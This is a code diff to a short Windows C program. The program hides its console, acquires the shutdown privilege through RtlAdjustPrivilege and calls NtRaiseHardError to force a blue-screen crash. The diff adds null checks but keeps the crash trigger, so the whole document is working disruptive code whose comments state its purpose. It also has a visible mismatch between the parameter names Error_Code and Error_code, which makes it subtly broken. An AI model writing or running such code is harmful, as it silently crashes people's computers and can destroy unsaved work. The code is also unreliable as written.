@@ -13,28 +13,47 @@ pdef_NtRaiseHardError NtRaiseHardError = (pdef_NtRaiseHardError)GetProcAddress(n
 // Simplified function to set and unset privilege
 NTSTATUS Set_Privilege(ULONG perm, BOOLEAN enable, BOOLEAN current_thread)
 {
-    BOOLEAN enabled;
-    return RtlAdjustPrivilege(perm, enable, current_thread, &enabled);
+    if (RtlAdjustPrivilege != NULL)
+    {
+        BOOLEAN enabled;
+        return RtlAdjustPrivilege(perm, enable, current_thread, &enabled);
+    }
+    else
+    {
+        return STATUS_NOTIFY_CLEANUP;
+    }
 }
 
 // Simplified function to trigger bsod
 NTSTATUS Trigger_BSOD(NTSTATUS Error_Code)
 {
-    ULONG response;
-    return NtRaiseHardError(Error_code, 0, 0, 0, 6, &response);
+    if (NtRaiseHardError != NULL)
+    {
+        ULONG response;
+        return NtRaiseHardError(Error_code, 0, 0, 0, 6, &response);
+    }
+    else
+    {
+        return STATUS_NOTIFY_CLEANUP;
+    }
 }
 
 VOID main()
 {
     // Hide console
     ShowWindow(GetConsoleWindow(), SW_HIDE);
-    // Check if get functions from ntdll.dll failed then exit.
-    if (RtlAdjustPrivilege == NULL || NtRaiseHardError == NULL) { goto Cleanup; }
+
     // Get shutdown privilege and check the result
-    if (Set_Privilege(19, TRUE, FALSE) == STATUS_SUCCESS) { 
+    if (Set_Privilege(19, TRUE, FALSE) == STATUS_SUCCESS) 
+    { 
         Trigger_BSOD(0xC0000350); // 0xC0000350 = STATUS_HOST_DOWN, The transport determined that the remote system is down. 
         goto Cleanup;
     }
+    else
+    {
+        goto Cleanup;
+    }
+
     // Cleanup code
     Cleanup:
     if (ntdll) { FreeLibrary(ntdll); }
